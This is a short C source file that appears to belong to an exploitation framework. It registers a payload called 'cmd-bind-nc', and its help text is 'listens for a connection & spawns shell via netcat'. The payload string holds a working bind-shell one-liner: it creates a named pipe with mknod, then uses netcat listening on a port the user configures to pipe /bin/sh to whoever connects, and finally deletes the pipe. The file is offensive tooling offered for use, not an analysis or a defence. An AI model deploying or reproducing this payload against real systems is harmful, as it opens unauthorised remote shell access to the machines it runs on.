
#include "../payloads.h"
#include "../exploits.h"

// payload's content
unsigned char cmdBindNcPayload[] = 
"mknod /tmp/sdkfhsdfklh p; nc -l -p %s 0</tmp/sdkfhsdfklh | /bin/sh >/tmp/sdkfhsdfklh 2>&1; rm /tmp/sdkfhsdfklh";

void cmdBindNcHelp()
{
    printf("listens for a connection & spawns shell via netcat\n");
}

// payload's options
struct payloadParam cmdBindNcOpts[MAX_NUM_OF_PARAMS] = {
    { "LPORT", REQUIRED, STRING, NOT_SET, NULL, NOT_SET }
    //TODO: INTERNAL param random file name
};

struct payload cmdBindNc = {
    4,
    "cmd-bind-nc",
    cmdBindNcPayload,
    111,
    cmdBindNcOpts,
    1,
    NULL,
    cmdBindNcHelp
};
